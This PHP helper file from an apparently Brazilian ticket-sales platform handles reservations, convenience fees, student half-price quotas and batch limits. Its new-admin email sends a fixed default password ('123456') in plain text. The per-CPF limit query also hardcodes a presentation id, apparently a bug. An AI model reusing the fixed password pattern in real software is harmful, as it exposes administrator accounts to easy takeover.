<?php
//ini_set('mssql.charset', 'UTF-8');
require('../settings/Metzli/autoload.php');
require_once($_SERVER['DOCUMENT_ROOT']."/settings/multisite/unique.php");
use Metzli\Encoder\Encoder;
use Metzli\Renderer\PngRenderer;

function getDefaultCardImageName() {
    return "card.jpg";
}
function getDefaultMap() {
    //return "/map/palco.png";
    return "http://media.tixs.me/palco.png";
}
function getDefaultMediaHost() {
    //return "http://localhost:1003";
    return "http://media.tixs.me";
}

function getMiniature($id) {
    $mainConnection = mainConnection();
    $query = 'SELECT e.cardimage
                from CI_MIDDLEWAY..mw_evento_extrainfo e
                where e.id_evento = ?';
    $rs = executeSQL($mainConnection, $query, array($id), true);

    $cardimage = $rs['cardimage'];

    $url = getDefaultMediaHost() . str_replace("{id}", $id,str_replace("{default_card}", getDefaultCardImageName(),$cardimage));
    return $url;
}

function sale_trace($id_cliente,$id_pedido_venda,$codVenda
	,$id_evento,$codPeca,$id_base,$id_session,$page,$lastMessage,$moreData,$isError) 
    {
    
    $query = "exec [dbo].[sale_trace_ins] ?
	,?
	,?
	,?
	,?
	,?
	,?
	,?
	,?
	,?
    ,?";
    
    $mainConnection = mainConnection();
    $params = array($id_cliente == null ? NULL : $id_cliente
	,$id_pedido_venda == null ? NULL : $id_pedido_venda
	,$codVenda == null ? NULL : $codVenda
	,$id_evento == null ? NULL : $id_evento
	,$codPeca == null ? NULL : $codPeca
	,$id_base == null ? NULL : $id_base
	,$id_session == null ? NULL : $id_session
	,$page == null ? NULL : $page
	,$lastMessage == null ? NULL : $lastMessage
	,$moreData == null ? NULL : $moreData
    ,$isError);
    
    $result = executeSQL($mainConnection, $query, $params);
}

function getSiteLogo() {
    echo "<img src='" .multiSite_getLogo()."' height='60px' id='logo' />";
}
    

function getSiteName() {
    echo "<h1 class='siteName'>$nomeSite</h1>";
}

function utf8_encode2($str) {
    if (preg_match('!!u', $str))
    {
       return $str;
    }
    else 
    {
       return utf8_encode($str);       
    }
}

/*  PEDIDOS  */
function tempoRestante($stamp = false) {
    $mainConnection = mainConnection();
    $query = 'SELECT TOP 1
                 CONVERT(VARCHAR(10), DT_VALIDADE, 103) DATA,  CONVERT(VARCHAR(8), DT_VALIDADE, 108) HORA
                 FROM MW_RESERVA
                 WHERE ID_SESSION = ?
                 ORDER BY DT_VALIDADE';
    $params = array(session_id());
    $rs = executeSQL($mainConnection, $query, $params, true);

    if ($stamp) {
    return $rs['DATA'] . ' - ' . $rs['HORA'];
    } else {
    $data = explode('/', $rs['DATA']);
    $hora = explode(':', $rs['HORA']);

    if (($data[1] - 1) < 0) {
        $retorno = '(new Date().getTime() + 3000)';
    } else {
        $retorno = $data[2] . ',' . ($data[1] - 1) . ',' . $data[0] . ',' . $hora[0] . ',' . $hora[1] . ',' . $hora[2];
    }

    return $retorno;
    }
}

function extenderTempo($min = NULL) {
    require_once('../settings/settings.php');

    if ($min != NULL) {
    $compraExpireTime = $min;
    }

    $mainConnection = mainConnection();
    $query = 'UPDATE MW_RESERVA SET
                 DT_VALIDADE = DATEADD(MI, ?, GETDATE())
                 WHERE ID_SESSION = ?';
    $params = array($compraExpireTime, session_id());

    $result = executeSQL($mainConnection, $query, $params) ? 'true' : 'false';

    return $result;
}

function verificarLimitePorCPF($conn, $codApresentacao, $user) {
    $mainConnection = mainConnection();

    if (isset($user)) {
    $rs = executeSQL($mainConnection, 'SELECT CD_CPF FROM MW_CLIENTE WHERE ID_CLIENTE = ?', array($user), true);
    $cpf = $rs[0];

    $query = 'SELECT (
                         SELECT ISNULL(QT_INGRESSOS_POR_CPF, 0)
                         FROM TABAPRESENTACAO A
                         INNER JOIN TABPECA P ON P.CODPECA = A.CODPECA
                         WHERE A.CODAPRESENTACAO = ?
                     ) AS QT_INGRESSOS_POR_CPF, (
                         SELECT SUM(CASE H.CODTIPLANCAMENTO WHEN 1 THEN 1 ELSE -1 END)
                         FROM TABCLIENTE C
                         INNER JOIN TABHISCLIENTE H ON H.CODIGO = C.CODIGO AND H.CODAPRESENTACAO = 1878
                         WHERE C.CPF = ?
                     ) AS QTDVENDIDO';
    $result = executeSQL($conn, $query, array($codApresentacao, $cpf));

    if (hasRows($result)) {
        $rs = fetchResult($result);
        if ($rs['QT_INGRESSOS_POR_CPF'] != 0 and $rs['QT_INGRESSOS_POR_CPF'] <= $rs['QTDVENDIDO']) {
        return 'Caro Sr(a)., este evento permite apenas ' . $rs['QT_INGRESSOS_POR_CPF'] . '
                        ingresso(s) por CPF. Seu saldo para compras é de ' . ($rs['QT_INGRESSOS_POR_CPF'] - $rs['QTDVENDIDO']) . '
                        ingresso(s).';
        }
    }
    }
    return NULL;
}

function obterValorServico($id_bilhete, $valor_pedido = false, $id_pedido = null, $is_pos = false) {

    $mainConnection = mainConnection();
        session_start();
    if ($id_pedido != null) {
            $query = 'SELECT TOP 1
                        TC.IN_TAXA_POR_PEDIDO,
                        PV.VL_TOTAL_TAXA_CONVENIENCIA,
                        TC.IN_COBRAR_PDV,
                        TC.IN_COBRAR_POS
                      FROM
                        MW_TAXA_CONVENIENCIA TC
                      INNER JOIN MW_PEDIDO_VENDA PV ON PV.DT_PEDIDO_VENDA >= TC.DT_INICIO_VIGENCIA
                      INNER JOIN MW_ITEM_PEDIDO_VENDA IPV ON IPV.ID_PEDIDO_VENDA = PV.ID_PEDIDO_VENDA
                      INNER JOIN MW_APRESENTACAO A ON A.ID_APRESENTACAO = IPV.ID_APRESENTACAO
                        AND A.ID_EVENTO = TC.ID_EVENTO
                      WHERE
                        PV.ID_PEDIDO_VENDA = ?
                      ORDER BY
                        TC.DT_INICIO_VIGENCIA DESC';
            $params = array($id_pedido);
            $rs = executeSQL($mainConnection, $query, $params, true);

            if ($rs['IN_COBRAR_POS'] == 'N' and $is_pos) return number_format(0, 2);

            if ($rs['IN_TAXA_POR_PEDIDO'] == 'S') {
                    return $valor_pedido ? number_format($rs['VL_TOTAL_TAXA_CONVENIENCIA'], 2) : 0;
            }

            $query = 'SELECT TOP 1 VL_TAXA_CONVENIENCIA FROM MW_ITEM_PEDIDO_VENDA WHERE ID_PEDIDO_VENDA = ? AND ID_APRESENTACAO_BILHETE = ?';
            $params = array($id_pedido, $id_bilhete);
            $rs = executeSQL($mainConnection, $query, $params, true);

            $valor = ($_SESSION['usuario_pdv'] == 1) ? ($rs['IN_COBRAR_PDV'] == 'S') ? $rs['VL_TAXA_CONVENIENCIA'] : 0 : $rs['VL_TAXA_CONVENIENCIA'];
    } else {                        
            $query = 'SELECT
                        E.ID_BASE,
                        E.ID_EVENTO
                      FROM
                        MW_EVENTO E
                      INNER JOIN MW_APRESENTACAO A ON A.ID_EVENTO = E.ID_EVENTO
                      INNER JOIN MW_APRESENTACAO_BILHETE B ON B.ID_APRESENTACAO = A.ID_APRESENTACAO
                      WHERE
                        B.ID_APRESENTACAO_BILHETE = ?';
            $params = array($id_bilhete);
            $rs = executeSQL($mainConnection, $query, $params, true);

            $id_base = $rs['ID_BASE'];
            $id_evento = $rs['ID_EVENTO'];

            $query = 'SELECT TOP 1
                        VL_TAXA_CONVENIENCIA,
                        IN_TAXA_CONVENIENCIA,
                        VL_TAXA_PROMOCIONAL,
                        IN_TAXA_POR_PEDIDO,
                        VL_TAXA_UM_INGRESSO,
                        VL_TAXA_UM_INGRESSO_PROMOCIONAL,
                        IN_COBRAR_PDV,
                        IN_COBRAR_POS
                      FROM
                        MW_TAXA_CONVENIENCIA
                      WHERE
                        ID_EVENTO = ? AND DT_INICIO_VIGENCIA <= GETDATE()
                      ORDER BY
                        DT_INICIO_VIGENCIA DESC';
            $params = array($id_evento);
            $rs = executeSQL($mainConnection, $query, $params, true);

            $tipo = $rs['IN_TAXA_CONVENIENCIA'];
            $normal = $rs['VL_TAXA_CONVENIENCIA'];
            $promo = $rs['VL_TAXA_PROMOCIONAL'];
            $vl_um_ingresso = $rs['VL_TAXA_UM_INGRESSO'];
            $vl_um_ingresso_promo = $rs['VL_TAXA_UM_INGRESSO_PROMOCIONAL'];
            $taxa_por_pedido = $rs['IN_TAXA_POR_PEDIDO'];
            $is_cobrar_pdv = $rs['IN_COBRAR_PDV'];

            if ($rs['IN_COBRAR_POS'] == 'N' and $is_pos) return number_format(0, 2);

            $conn = getConnection($id_base);

            $query = 'SELECT
                        AB.VL_LIQUIDO_INGRESSO,
                        PC.ID_PROMOCAO_CONTROLE,
                        PC.IN_VALOR_SERVICO
                      FROM
                        CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB
                      INNER JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = AB.CODTIPBILHETE
                      LEFT JOIN CI_MIDDLEWAY..MW_PROMOCAO_CONTROLE PC ON PC.ID_PROMOCAO_CONTROLE = TTB.ID_PROMOCAO_CONTROLE
                        AND PC.IN_ATIVO = 1
                      WHERE
                        AB.IN_ATIVO = 1
                        AND AB.ID_APRESENTACAO_BILHETE = ?';
            $params = array($id_bilhete);
            $rs = executeSQL($conn, $query, $params, true);

            $quantidade = executeSQL($mainConnection, 'SELECT COUNT(1) AS INGRESSOS FROM MW_RESERVA WHERE ID_SESSION = ?', array(session_id()), true);

            if ($taxa_por_pedido == 'S') {

                // nao cobrar taxa de servico
                if ($rs['IN_VALOR_SERVICO'] === 0) {

                    $query = "SELECT DISTINCT R.ID_APRESENTACAO_BILHETE, E.ID_BASE
                                FROM MW_RESERVA R
                                INNER JOIN MW_APRESENTACAO A ON A.ID_APRESENTACAO = R.ID_APRESENTACAO
                                INNER JOIN MW_EVENTO E ON E.ID_EVENTO = A.ID_EVENTO
                                WHERE R.ID_SESSION = ?";
                    $params = array(session_id());
                    $result = executeSQL($mainConnection, $query, $params);

                    $query = "SELECT PC.IN_VALOR_SERVICO
                              FROM CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB
                              INNER JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = AB.CODTIPBILHETE
                              LEFT JOIN CI_MIDDLEWAY..MW_PROMOCAO_CONTROLE PC ON PC.ID_PROMOCAO_CONTROLE = TTB.ID_PROMOCAO_CONTROLE AND PC.IN_ATIVO = 1
                              WHERE AB.IN_ATIVO = 1 AND AB.ID_APRESENTACAO_BILHETE = ?";
                    $cobrar_servico = false;
                    
                    while ($rs2 = fetchResult($result)) {
                        $conn = getConnection($rs2['ID_BASE']);
                        $params = array($rs2['ID_APRESENTACAO_BILHETE']);
                        $rs3 = executeSQL($conn, $query, $params, true);

                        $cobrar_servico = ($cobrar_servico or ($rs3['IN_VALOR_SERVICO'] !== 0));
                    }

                    if (!$cobrar_servico) {
                        return 0;
                    }
                }

                if ($tipo == 'V') {
                    $valor = $valor_pedido ? ($quantidade['INGRESSOS'] == 1 ? $vl_um_ingresso : $normal) : 0;
                } else {
                    $valor = $valor_pedido ? number_format(($quantidade['INGRESSOS'] == 1 ? ($vl_um_ingresso / 100) * $rs['VL_LIQUIDO_INGRESSO'] : obterValorPercentualServicoPorPedido()), 2) : 0;
                }
            } else {

                // nao cobrar taxa de servico
                if ($rs['IN_VALOR_SERVICO'] === 0) {
                    return 0;
                }

                $valor = $tipo == 'V'
                                ? ($quantidade['INGRESSOS'] == 1 ? (is_null($rs['ID_PROMOCAO_CONTROLE']) ? $vl_um_ingresso : $vl_um_ingresso_promo) : (is_null($rs['ID_PROMOCAO_CONTROLE']) ? $normal : $promo))
                                : (($quantidade['INGRESSOS'] == 1 ? (is_null($rs['ID_PROMOCAO_CONTROLE']) ? $vl_um_ingresso : $vl_um_ingresso_promo) : (is_null($rs['ID_PROMOCAO_CONTROLE']) ? $normal : $promo)) / 100) * $rs['VL_LIQUIDO_INGRESSO'];
            }

            if( isset($_SESSION['usuario_pdv']) and $_SESSION['usuario_pdv'] == 1 ){
                if($is_cobrar_pdv == 'N'){
                    $valor = 0;
                }
            }

    }
    return number_format($valor, 2);
}

function obterValorPercentualServicoPorPedido() {

    $mainConnection = mainConnection();
    session_start();
    $soma = 0;

    $query = 'SELECT R.ID_APRESENTACAO_BILHETE, E.ID_BASE, TC.VL_TAXA_CONVENIENCIA, TC.VL_TAXA_PROMOCIONAL
                FROM MW_RESERVA R
                INNER JOIN MW_APRESENTACAO A ON R.ID_APRESENTACAO = A.ID_APRESENTACAO
                INNER JOIN MW_EVENTO E ON A.ID_EVENTO = E.ID_EVENTO
                INNER JOIN MW_TAXA_CONVENIENCIA TC ON TC.ID_EVENTO = E.ID_EVENTO
                    AND TC.DT_INICIO_VIGENCIA = (SELECT MAX(DT_INICIO_VIGENCIA) FROM MW_TAXA_CONVENIENCIA TC2 WHERE TC2.ID_EVENTO = TC.ID_EVENTO AND TC2.DT_INICIO_VIGENCIA <= GETDATE())
                WHERE R.ID_SESSION = ? AND R.DT_VALIDADE >= GETDATE()';
    $params = array(session_id());
    $result = executeSQL($mainConnection, $query, $params);

    while ($rs = fetchResult($result)) {
        $id_bilhete = $rs['ID_APRESENTACAO_BILHETE'];
        $normal = $rs['VL_TAXA_CONVENIENCIA'];
        $promo = $rs['VL_TAXA_PROMOCIONAL'];
        $conn = getConnection($rs['ID_BASE']);

        $query = 'SELECT AB.VL_LIQUIDO_INGRESSO, PC.ID_PROMOCAO_CONTROLE
                    FROM CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB
                      LEFT JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = AB.CODTIPBILHETE
                      LEFT JOIN CI_MIDDLEWAY..MW_PROMOCAO_CONTROLE PC ON PC.ID_PROMOCAO_CONTROLE = TTB.ID_PROMOCAO_CONTROLE
                        AND PC.IN_ATIVO = 1 AND PC.CODTIPPROMOCAO = 4
                    WHERE AB.IN_ATIVO = 1
                    AND AB.ID_APRESENTACAO_BILHETE = ?';
        $params = array($id_bilhete);
        $rs = executeSQL($conn, $query, $params, true);

        $soma += (is_null($rs['ID_PROMOCAO_CONTROLE']) ? ($normal / 100) * $rs['VL_LIQUIDO_INGRESSO'] : ($promo / 100) * $rs['VL_LIQUIDO_INGRESSO']);
    }

    return $soma;
}

function enviarEmailNovaConta ($login, $nome, $email) {

    $subject = 'Aviso de Acesso';
    $from = '';
    $namefrom = multiSite_getTitle();

    //define the body of the message.
    ob_start(); //Turn on output buffering
?>
<p>&nbsp;</p>
<div style="background-color: rgb(255, 255, 255); padding-top: 5px; padding-right: 5px; padding-bottom: 5px; padding-left: 5px; margin-top: 0px; margin-right: 0px; margin-bottom: 0px; margin-left: 0px; ">
<p style="text-align: left; font-family: Arial, Verdana, sans-serif; font-size: 12px; ">&nbsp;<img alt="" src="<?php multiSite_getLogoFullURI(); ?>" /><span style="font-family: Verdana; "><strong>GEST&Atilde;O E ADMINISTRA&Ccedil;&Atilde;O DE INGRESSOS</strong></span></p>
<h3 style="font-family: Arial, Verdana, sans-serif; font-size: 12px; "><strong>&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;</strong><strong>NOTIFICA&Ccedil;&Atilde;O&nbsp;DE&nbsp;ACESSO</strong></h3>
<h2 style="margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">Ol&aacute;,&nbsp;</span><span style="color: rgb(181, 9, 56); "><span style="font-size: smaller; "><span style="font-family: Verdana, sans-serif; "><?php echo $nome; ?></span></span></span><span style="font-size: medium; "><span style="font-family: Verdana; "><strong><span><br />
</span></strong></span></span></h2>
<p style="text-align: left; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 97, 97); "><span style="font-family: Verdana; "><span style="font-size: 10pt; ">Conta de acesso administrativo.</span></span></span><br />
&nbsp;</p>
<p style="text-align: left; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 97, 97); "><span style="font-family: Verdana; "><span style="font-size: 10pt; ">Para efetuar o login voc&ecirc; deve utilizar as seguintes informa&ccedil;&otilde;es:</span></span></span></p>
<p style="text-align: left; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><em><span style="font-size: small; "><span style="color: rgb(97, 97, 98); "><span style="font-family: Verdana, sans-serif; ">
<ul>
    <li>URL: <a href="<?php echo multiSite_getURIAdmin(); ?>"><?php echo multiSite_getURIAdmin(); ?></a></li>
    <li>Usu&aacute;rio: <?php echo $login; ?></li>
    <li>Senha: 123456</li>
</ul>
</span></span></span></em></p>
<div style="line-height: normal; margin-left: 40px; "><strong><em><?php echo $novaSenha; ?></em></strong></div>
<p style="text-align: left; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><em><span style="font-size: small; "><span style="color: rgb(97, 97, 98); "><span style="font-family: Verdana, sans-serif; ">obs-Ap&oacute;s o pr&oacute;ximo acesso o sistema solicitar&aacute; a troca da senha.</span></span></span></em></p>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">&nbsp;</span></div>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Atenciosamente</span></div>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; ">&nbsp;</div>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<?php echo multiSite_getName(); ?>&nbsp;&nbsp;</span><span style="color: rgb(98, 98, 97); "><?php echo multiSite_getPhone(); ?></span></div>
<div style="line-height: normal; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); ">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
<div style="line-height: normal; margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="font-family: Verdana, sans-serif; font-size: 8pt; ">&nbsp;</span><span style="font-family: Verdana, sans-serif; font-size: 8pt; "><br />
</span></div>
<p style="margin-left: 40px; font-family: Arial, Verdana, sans-serif; font-size: 12px; "><span style="color: rgb(98, 98, 97); "><span style="font-size: smaller; ">Esse &eacute; um e-mail autom&aacute;tico. N&atilde;o &eacute; necess&aacute;rio respond&ecirc;-lo.</span></span></p>
</div>
<p>&nbsp;</p>
<?php
    //copy current buffer contents into $message variable and delete current output buffer
    $message = ob_get_clean();
    return authSendEmail($from, $namefrom, $email, $nome, $subject, $message);
}

function getTotalMeiaEntrada ($apresentacao) {
    $mainConnection = mainConnection();
    $total = 0;

    $query = 'SELECT e.id_base
                from mw_evento e
                inner join mw_apresentacao a on e.id_evento = a.id_evento
                where a.id_apresentacao = ?';
    $rs = executeSQL($mainConnection, $query, array($apresentacao), true);

    $conn = getConnection($rs['id_base']);

    $query = "SELECT StaCalculoMeiaEstudante, CotaMeiaEstudante, StaCalculoPorSala
                from tabTipBilhete
                where StaTipBilhMeiaEstudante = 'S' and StaTipBilhete = 'A'
                and CodTipBilhete in (select CodTipBilhete from ci_middleway..mw_apresentacao_bilhete where id_apresentacao = ? AND IN_ATIVO = 1)";
    $rs = executeSQL($conn, $query, array($apresentacao), true);

    if ($rs['StaCalculoMeiaEstudante'] == 'P') {
        if ($rs['StaCalculoPorSala'] == 'S') {
            $query = "SELECT COALESCE(COUNT(tsd.Indice), 0) as TOTAL FROM tabSalDetalhe tsd
                        INNER JOIN tabApresentacao ta ON ta.CodSala = tsd.CodSala
                        INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CodApresentacao = ta.CodApresentacao
                        WHERE A.ID_APRESENTACAO = ? AND A.IN_ATIVO = 1 AND tsd.TipObjeto <> 'I'";
            $params = array($apresentacao);
        } else {
            $query = "SELECT COALESCE(COUNT(tsd.Indice), 0) as TOTAL FROM tabSalDetalhe tsd
                        INNER JOIN tabApresentacao ta ON ta.CodSala = tsd.CodSala
                        INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CodApresentacao = ta.CodApresentacao
                        WHERE A.ID_EVENTO = (SELECT ID_EVENTO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
                        AND A.DT_APRESENTACAO = (SELECT DT_APRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
                        AND A.HR_APRESENTACAO = (SELECT HR_APRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
                        AND A.IN_ATIVO = 1
                        AND tsd.TipObjeto <> 'I'";
            $params = array($apresentacao, $apresentacao, $apresentacao);
        }
        
        $rs2 = executeSQL($conn, $query, $params, true);

        $total = ceil($rs2['TOTAL'] * ($rs['CotaMeiaEstudante'] / 100));
    } else if ($rs['StaCalculoMeiaEstudante'] == 'Q') {
        $total = $rs['CotaMeiaEstudante'];
    }

    return $total;
}

function getTotalMeiaEntradaDisponivel ($apresentacao) {
    $mainConnection = mainConnection();
    $total = 0;

    $query = 'SELECT e.id_base
                from mw_evento e
                inner join mw_apresentacao a on e.id_evento = a.id_evento
                where a.id_apresentacao = ?';
    $rs = executeSQL($mainConnection, $query, array($apresentacao), true);

    $conn = getConnection($rs['id_base']);

    $query = "SELECT StaCalculoPorSala
                from tabTipBilhete
                where StaTipBilhMeiaEstudante = 'S' and StaTipBilhete = 'A'
                and CodTipBilhete in (select CodTipBilhete from ci_middleway..mw_apresentacao_bilhete where id_apresentacao = ?)";
    $rs = executeSQL($conn, $query, array($apresentacao), true);

    if ($rs['StaCalculoPorSala'] == 'S') {
        $query = "SELECT COALESCE(COUNT(TLS.INDICE),0) AS TOTAL FROM TABLUGSALA TLS
                    INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CODAPRESENTACAO = TLS.CODAPRESENTACAO
                    INNER JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = TLS.CODTIPBILHETE
                    WHERE TLS.CODAPRESENTACAO IN (SELECT CODAPRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = A.ID_APRESENTACAO AND IN_ATIVO = 1)
                    AND TLS.CODTIPBILHETE IN (SELECT CODTIPBILHETE FROM CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE WHERE ID_APRESENTACAO = A.ID_APRESENTACAO)
                    AND TTB.STATIPBILHMEIAESTUDANTE = 'S' AND TTB.STATIPBILHETE = 'A' AND A.ID_APRESENTACAO = ? AND TLS.CODVENDACOMPLMEIA IS NULL";
        $params = array($apresentacao);
    } else {
        $query = "SELECT COALESCE(COUNT(TLS.INDICE),0) AS TOTAL FROM TABLUGSALA TLS
                    INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CODAPRESENTACAO = TLS.CODAPRESENTACAO
                    INNER JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = TLS.CODTIPBILHETE
                    WHERE A.ID_EVENTO = (SELECT ID_EVENTO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
                    AND A.DT_APRESENTACAO = (SELECT DT_APRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
                    AND A.HR_APRESENTACAO = (SELECT HR_APRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = ? AND IN_ATIVO = 1)
                    AND A.IN_ATIVO = 1
                    AND TLS.CODAPRESENTACAO IN (SELECT CODAPRESENTACAO FROM CI_MIDDLEWAY..MW_APRESENTACAO WHERE ID_APRESENTACAO = A.ID_APRESENTACAO AND IN_ATIVO = 1)
                    AND TLS.CODTIPBILHETE IN (SELECT CODTIPBILHETE FROM CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE WHERE ID_APRESENTACAO = A.ID_APRESENTACAO)
                    AND TTB.STATIPBILHMEIAESTUDANTE = 'S' AND TTB.STATIPBILHETE = 'A' AND TLS.CODVENDACOMPLMEIA IS NULL";
        $params = array($apresentacao, $apresentacao, $apresentacao);
    }
    
    $rs = executeSQL($conn, $query, $params, true);

    return getTotalMeiaEntrada($apresentacao) - $rs['TOTAL'];
}

function getCaixaTotalMeiaEntrada($apresentacao) {
    $mainConnection = mainConnection();

    $query = 'SELECT e.id_base
                from mw_evento e
                inner join mw_apresentacao a on e.id_evento = a.id_evento
                where a.id_apresentacao = ?';
    $rs = executeSQL($mainConnection, $query, array($apresentacao), true);

    $conn = getConnection($rs['id_base']);

    $query = "SELECT StaCalculoPorSala
                from tabTipBilhete
                where StaTipBilhMeiaEstudante = 'S' and StaTipBilhete = 'A'
                and CodTipBilhete in (select CodTipBilhete from ci_middleway..mw_apresentacao_bilhete where id_apresentacao = ? and in_ativo = 1)";
    $rs = executeSQL($conn, $query, array($apresentacao), true);

    if ($rs['StaCalculoPorSala'] == 'S') {
        $t = getTotalMeiaEntradaDisponivel($apresentacao);
        $t = ($t < 0 ? 0 : $t);

        $html = "<p>Existem <b><span class='contagem-meia'>" . $t . "</span></b> de <b><span>" . getTotalMeiaEntrada($apresentacao) . "</span></b> ingressos disponíveis para <a href='" . multiSite_getURI("meia_entrada.html") . "' target='_blank'>meia-entrada</a>.</p>";
    } else {
        $html = '';
    }

    return $html;
}

function getTotalLote ($bilhete) {
    $mainConnection = mainConnection();
    $total = 0;

    $query = 'SELECT e.id_base
                from mw_evento e
                inner join mw_apresentacao a on e.id_evento = a.id_evento
                inner join mw_apresentacao_bilhete ab on ab.id_apresentacao = a.id_apresentacao
                where ab.id_apresentacao_bilhete = ?';
    $rs = executeSQL($mainConnection, $query, array($bilhete), true);

    $conn = getConnection($rs['id_base']);

    $query = "SELECT ttb.QtdVendaPorLote
                from tabTipBilhete ttb
                inner join ci_middleway..mw_apresentacao_bilhete ab on ab.CodTipBilhete = ttb.CodTipBilhete
                where ttb.QTDVENDAPORLOTE > 0 and ttb.StaTipBilhMeiaEstudante = 'N' and ttb.StaTipBilhete = 'A'
                and ab.id_apresentacao_bilhete = ? and ab.IN_ATIVO = 1";
    $rs = executeSQL($conn, $query, array($bilhete), true);

    return $rs['QtdVendaPorLote'];
}

function getTotalLoteDisponivel ($bilhete) {
    $mainConnection = mainConnection();
    $total = 0;

    $query = 'SELECT e.id_base, A.ID_EVENTO, CONVERT(VARCHAR, A.DT_APRESENTACAO, 112) DT_APRESENTACAO, A.HR_APRESENTACAO, AB.CODTIPBILHETE
                from mw_evento e
                inner join mw_apresentacao a on e.id_evento = a.id_evento
                inner join mw_apresentacao_bilhete ab on ab.id_apresentacao = a.id_apresentacao
                where ab.id_apresentacao_bilhete = ?';
    $rs = executeSQL($mainConnection, $query, array($bilhete), true);

    $conn = getConnection($rs['id_base']);
    
    $query = "SELECT COALESCE(COUNT(TLS.INDICE),0) AS TOTAL FROM TABLUGSALA TLS
                INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO A ON A.CODAPRESENTACAO = TLS.CODAPRESENTACAO
                INNER JOIN CI_MIDDLEWAY..MW_APRESENTACAO_BILHETE AB ON AB.ID_APRESENTACAO = A.ID_APRESENTACAO AND TLS.CODTIPBILHETE = AB.CODTIPBILHETE
                INNER JOIN TABTIPBILHETE TTB ON TTB.CODTIPBILHETE = AB.CODTIPBILHETE
                WHERE A.ID_EVENTO = ? AND A.DT_APRESENTACAO = ? AND A.HR_APRESENTACAO = ?
                AND A.IN_ATIVO = 1 AND AB.IN_ATIVO = 1 AND TTB.CODTIPBILHETE = ?
                AND TTB.QTDVENDAPORLOTE > 0 AND TTB.STATIPBILHMEIAESTUDANTE = 'N' AND TTB.STATIPBILHETE = 'A'";
    $params = array($bilhete);
    $rs = executeSQL($conn, $query, array($rs['ID_EVENTO'], $rs['DT_APRESENTACAO'], $rs['HR_APRESENTACAO'], $rs['CODTIPBILHETE']), true);

    return getTotalLote($bilhete) - $rs['TOTAL'];
}

function getURLApresentacaoAtual() {
    $mainConnection = mainConnection();

    $query = 'SELECT A.ID_APRESENTACAO, E.DS_EVENTO
                from mw_evento e
                inner join mw_apresentacao a on e.id_evento = a.id_evento
                inner join mw_reserva r on r.id_apresentacao = a.id_apresentacao
                where r.id_session = ?';
    $rs = executeSQL($mainConnection, $query, array(session_id()), true);

    return 'etapa1.php?apresentacao='.$rs['ID_APRESENTACAO'].'&eventoDS='.utf8_encode2($rs['DS_EVENTO']);
}

function getPrimeiroValorAssinatura($id_usuario, $id_assinatura) {
    $mainConnection = mainConnection();

    $query = 'WITH RESULTADO AS (
                    SELECT AV.QT_MES_VIGENCIA, AV.VL_ASSINATURA, MAX(AV.VL_ASSINATURA) VALOR_MAXIMO
                    FROM MW_ASSINATURA_VALOR AV
                    WHERE AV.ID_ASSINATURA = ?
                    GROUP BY AV.QT_MES_VIGENCIA, AV.VL_ASSINATURA
                )
                SELECT TOP 1 VL_ASSINATURA
                FROM RESULTADO
                WHERE (EXISTS (SELECT TOP 1 1 FROM MW_ASSINATURA_CLIENTE WHERE ID_CLIENTE = ?) AND VL_ASSINATURA IN (SELECT MAX(VL_ASSINATURA) FROM RESULTADO))
                        OR
                        (NOT EXISTS (SELECT TOP 1 1 FROM MW_ASSINATURA_CLIENTE WHERE ID_CLIENTE = ?))
                ORDER BY QT_MES_VIGENCIA';
    $params = array($id_assinatura, $id_usuario, $id_usuario);
    $rs = executeSQL($mainConnection, $query, $params, true);

    return $rs['VL_ASSINATURA'];
}

